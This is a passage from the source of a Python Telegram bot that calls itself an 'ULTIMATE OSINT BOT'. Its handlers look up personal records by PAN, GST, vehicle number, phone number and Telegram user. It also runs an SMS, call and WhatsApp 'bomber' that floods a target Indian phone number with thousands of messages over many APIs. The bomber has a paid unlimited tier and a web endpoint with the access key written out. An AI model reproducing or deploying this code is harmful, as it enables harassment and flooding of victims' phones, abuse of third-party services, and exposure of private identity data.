        if result and result.get('success'):
            formatted = format_generic_result(result, "🏦 IFSC Info", "🏦 IFSC", clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'ifsc', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== VEHICLE ==========
    elif state == "waiting_vehicle":
        clean = re.sub(r'\s+', '', text).upper()
        if len(clean) < 8:
            bot.reply_to(m, format_message("<b>❌ Invalid RC number!</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_vehicle_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_generic_result(result, "🚗 Vehicle Info", "🚗 RC", clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'vehicle', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== GST ==========
    elif state == "waiting_gst":
        clean = text.upper().strip()
        if len(clean) < 10:
            bot.reply_to(m, format_message("<b>❌ Invalid GST number!</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_gst_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_generic_result(result, "💼 GST Info", "💼 GST", clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'gst', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== PAN ==========
    elif state == "waiting_pan":
        clean = text.upper().strip()
        if not re.match(r'^[A-Z]{5}[0-9]{4}[A-Z]$', clean):
            bot.reply_to(m, format_message("<b>❌ Invalid PAN! Format: ABCDE1234F</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_pan_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_generic_result(result, "🪪 PAN Info", "🪪 PAN", clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'pan', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== PAK NUM ==========
    elif state == "waiting_pak":
        clean = re.sub(r'[^\d]', '', text)
        if len(clean) < 10:
            bot.reply_to(m, format_message("<b>❌ Invalid Pakistan number!</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_pak_num_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_generic_result(result, "🇵🇰 Pak Number Info", "🇵🇰 Number", clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'pak_num', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== PINCODE ==========
    elif state == "waiting_pincode":
        clean = re.sub(r'[^\d]', '', text)
        if len(clean) != 6:
            bot.reply_to(m, format_message("<b>❌ Invalid pincode! 6 digits.</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_pincode_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_generic_result(result, "📍 Pincode Info", "📍 Pincode", clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'pincode', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== FREE FIRE ==========
    elif state == "waiting_ff":
        clean = re.sub(r'[^\d]', '', text)
        if len(clean) < 5:
            bot.reply_to(m, format_message("<b>❌ Invalid Free Fire UID!</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_ff_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_generic_result(result, "🎮 Free Fire Info", "🎮 UID", clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'ff', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== HITEK NUM ==========
    elif state == "waiting_hitek_num":
        clean = re.sub(r'[^\d]', '', text)
        if len(clean) < 10:
            bot.reply_to(m, format_message("<b>❌ Invalid number!</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>💎 Searching Hitek...</b>"), parse_mode='HTML')
        result = get_hitek_num_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_generic_result(result, "💎 Hitek Num Info", "📱 Number", clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'hitek_num', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== HITEK FULL ==========
    elif state == "waiting_hitek_full":
        if len(text) < 2:
            bot.reply_to(m, format_message("<b>❌ Invalid query! Min 2 chars.</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🌟 Searching Hitek Full...</b>"), parse_mode='HTML')
        result = get_hitek_full_info(text)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_generic_result(result, "🌟 Hitek Full Info", "🔍 Query", text)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'hitek_full', text, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== TELEGRAM USERNAME ==========
    elif state == "waiting_username":
        clean = text.replace('@', '').strip()
        if len(clean) < 2:
            bot.reply_to(m, format_message("<b>❌ Invalid username!</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_tg_user_info(clean)
        user_state.pop(uid, None)
        
        if result.get('success'):
            formatted = format_tg_user_result(result, clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'username', clean, result)
        else:
            bot.edit_message_text(
                format_message(f"<b>❌ {result.get('msg', 'User not found')}</b>\n\n"
                              "💡 Try:\n• Check spelling\n• Use /userid with numeric ID"),
                m.chat.id, status.message_id, parse_mode='HTML'
            )
    
    # ========== TELEGRAM ID ==========
    elif state == "waiting_userid":
        clean = text.strip()
        if not clean:
            bot.reply_to(m, format_message("<b>❌ Invalid input!</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        
        if clean.startswith('@') or not clean.isdigit():
            username = clean.replace('@', '').strip()
            result = get_tg_user_info(username)
        else:
            result = get_tg_user_info(clean)
        
        user_state.pop(uid, None)
        
        if result.get('success'):
            formatted = format_tg_user_result(result, clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'userid', clean, result)
        else:
            bot.edit_message_text(
                format_message(f"<b>❌ {result.get('msg', 'User not found')}</b>\n\n"
                              "💡 Try:\n• Check spelling\n• Use @username or numeric ID"),
                m.chat.id, status.message_id, parse_mode='HTML'
            )
    
    # ========== BRUTAL BOMBER ==========
    elif state == "waiting_brutal_bomb":
        clean = re.sub(r'[^\d]', '', text)
        if len(clean) != 10 or not clean[0] in '6789':
            bot.reply_to(m, format_message("<b>❌ Invalid number! 10 digits starting with 6/7/8/9.</b>"), parse_mode='HTML')
            return
        
        user_state.pop(uid, None)
        status_msg = bot.reply_to(m, format_message(
            f"<b>💣 Starting Brutal Bomber...</b>\n"
            f"📱 Target: <code>{clean}</code>\n"
            f"⚡ {len(ALL_APIS)}+ APIs\n"
            f"⏱️ 5 MINUTES continuous!\n"
            f"🎯 5000 SMS | 1000 Calls | 500 WhatsApp\n"
            f"🔑 Key: <code>MADX</code>"
        ), parse_mode='HTML')
        
        result = start_brutal_bomb(clean)
        
        if result.get('success'):
            bomber_id = result.get('bomber_id', '')
            bomber_active[uid] = {
                'bomber_id': bomber_id,
                'phone': clean,
                'started': datetime.now()
            }
            
            progress_text = f"""
<b>💣💀 BRUTAL BOMBER STARTED!</b>
━━━━━━━━━━━━━━━━━━
📱 <b>Target:</b> <code>+91{clean}</code>
⏱️ <b>Duration:</b> 5 MINUTES
🎯 <b>Targets:</b> 5000 SMS | 1000 Calls | 500 WhatsApp
🔑 <b>Key:</b> <code>MADX</code>
━━━━━━━━━━━━━━━━━━
⏳ <b>Status:</b> Running...
💀 <b>Intensity:</b> MAXIMUM

🛑 Click STOP button below to stop!
"""
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🛑 STOP BOMBER", callback_data=f"stop_bomb_{bomber_id}"))
            
            try:
                bot.edit_message_text(
                    format_message(progress_text),
                    m.chat.id,
                    status_msg.message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except Exception:
                bot.send_message(
                    m.chat.id,
                    format_message(progress_text),
                    parse_mode='HTML',
                    reply_markup=markup
                )
            
            def update_status():
                while bomber_id in active_bombers and not active_bombers[bomber_id].get('completed', False):
                    time.sleep(10)
                    if bomber_id in active_bombers:
                        info = active_bombers[bomber_id]
                        if info.get('completed', False):
                            break
                if bomber_id in active_bombers and active_bombers[bomber_id].get('completed', False):
                    result_text = format_brutal_result(bomber_id)
                    try:
                        bot.edit_message_text(
                            format_message(result_text),
                            m.chat.id,
                            status_msg.message_id,
                            parse_mode='HTML'
                        )
                    except Exception:
                        bot.send_message(
                            m.chat.id,
                            format_message(result_text),
                            parse_mode='HTML'
                        )
            
            threading.Thread(target=update_status, daemon=True).start()
            
        else:
            bot.edit_message_text(
                format_message(f"<b>❌ Bombing failed!</b>\n{result.get('msg', 'Unknown error')}"),
                m.chat.id, status_msg.message_id, parse_mode='HTML'
            )
    
    # ========== PREMIUM BOMBER ==========
    elif state == "waiting_premium_bomb":
        clean = re.sub(r'[^\d]', '', text)
        if len(clean) != 10 or not clean[0] in '6789':
            bot.reply_to(m, format_message("<b>❌ Invalid number!</b>"), parse_mode='HTML')
            return
        
        user_state.pop(uid, None)
        status_msg = bot.reply_to(m, format_message(
            f"<b>💎 Starting Premium Bomber...</b>\n"
            f"📱 Target: <code>{clean}</code>\n"
            f"⚡ {len(ALL_APIS)}+ APIs\n"
            f"⏱️ <b>UNLIMITED</b> (Premium)\n"
            f"🎯 5000 SMS | 1000 Calls | 500 WhatsApp\n"
            f"🔑 Key: <code>MADX</code>"
        ), parse_mode='HTML')
        
        result = start_brutal_bomb(clean)
        
        if result.get('success'):
            bomber_id = result.get('bomber_id', '')
            paid_bomber_active[uid] = {
                'bomber_id': bomber_id,
                'phone': clean,
                'started': datetime.now()
            }
            
            progress_text = f"""
<b>💎💀 PREMIUM BOMBER STARTED!</b>
━━━━━━━━━━━━━━━━━━
📱 <b>Target:</b> <code>+91{clean}</code>
⏱️ <b>Duration:</b> UNLIMITED (Premium)
🎯 <b>Targets:</b> 5000 SMS | 1000 Calls | 500 WhatsApp
🔑 <b>Key:</b> <code>MADX</code>
━━━━━━━━━━━━━━━━━━
⏳ <b>Status:</b> Running...
💀 <b>Intensity:</b> MAXIMUM

🛑 Click STOP button below to stop!
"""
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🛑 STOP BOMBER", callback_data=f"stop_bomb_{bomber_id}"))
            
            try:
                bot.edit_message_text(
                    format_message(progress_text),
                    m.chat.id,
                    status_msg.message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except Exception:
                bot.send_message(
                    m.chat.id,
                    format_message(progress_text),
                    parse_mode='HTML',
                    reply_markup=markup
                )
            
            def update_status_premium():
                while bomber_id in paid_bomber_active and not paid_bomber_active[bomber_id].get('completed', False):
                    time.sleep(10)
                if bomber_id in paid_bomber_active and paid_bomber_active[bomber_id].get('completed', False):
                    result_text = format_brutal_result(bomber_id)
                    try:
                        bot.edit_message_text(
                            format_message(result_text),
                            m.chat.id,
                            status_msg.message_id,
                            parse_mode='HTML'
                        )
                    except Exception:
                        bot.send_message(
                            m.chat.id,
                            format_message(result_text),
                            parse_mode='HTML'
                        )
            
            threading.Thread(target=update_status_premium, daemon=True).start()
            
        else:
            bot.edit_message_text(
                format_message(f"<b>❌ Premium bombing failed!</b>\n{result.get('msg', 'Unknown error')}"),
                m.chat.id, status_msg.message_id, parse_mode='HTML'
            )
    
    # ========== REDEEM ==========
    elif state == "waiting_redeem":
        code = text.upper().strip()
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        try:
            c.execute("SELECT credits, max_uses, used_count, expires_at FROM redeem_codes WHERE code = ? AND is_active = 1", (code,))
            row = c.fetchone()
            if row:
                credits, max_uses, used_count, expires_at = row
                if used_count >= max_uses:
                    bot.reply_to(m, format_message("<b>❌ Code fully used!</b>"), parse_mode='HTML')
                elif expires_at and datetime.now() > datetime.strptime(expires_at, "%Y-%m-%d %H:%M:%S"):
                    bot.reply_to(m, format_message("<b>❌ Code expired!</b>"), parse_mode='HTML')
                else:
                    c.execute("UPDATE redeem_codes SET used_count = used_count + 1 WHERE code = ?", (code,))
                    c.execute("INSERT OR IGNORE INTO redeemed_users (user_id, code, redeemed_at) VALUES (?, ?, ?)",
                              (uid, code, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                    add_credits(uid, credits)
                    conn.commit()
                    bot.reply_to(m, format_message(f"<b>✅ +{credits} credits!</b>\n💰 Total: <code>{get_credits(uid)}</code>"), parse_mode='HTML')
            else:
                bot.reply_to(m, format_message("<b>❌ Invalid code!</b>"), parse_mode='HTML')
        except Exception as e:
            bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')
        finally:
            conn.close()
            user_state.pop(uid, None)
    
    else:
        user_state.pop(uid, None)

# ==================== MAIN ====================

def main():
    print("=" * 60)
    print("🔥 ULTIMATE OSINT BOT STARTING...")
    print("=" * 60)
    
    init_db()
    
    web_thread = threading.Thread(target=run_web, daemon=True, name="flask")
    web_thread.start()
    time.sleep(1)
    print("✅ Flask web server started on port 10000")
    print(f"✅ Brutal Bomber API: /bomb?key=MADX&num=9876543210")
    print(f"✅ Total Brutal Bomber APIs: {len(ALL_APIS)}")
    print(f"🎯 Targets: 5000 SMS | 1000 Calls | 500 WhatsApp")
    print(f"⏱️ Duration: 5 Minutes")
    
    print(f"✅ Bot Token: {BOT_TOKEN[:10]}...")
    print(f"✅ Owner ID: {OWNER_ID}")
    print(f"🔑 Brutal Bomber Key: MADX")
    print("=" * 60)
    
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=30)
    except Exception as e:
        print(f"❌ Polling error: {e}")
        time.sleep(5)
        main()

if __name__ == "__main__":
    main()
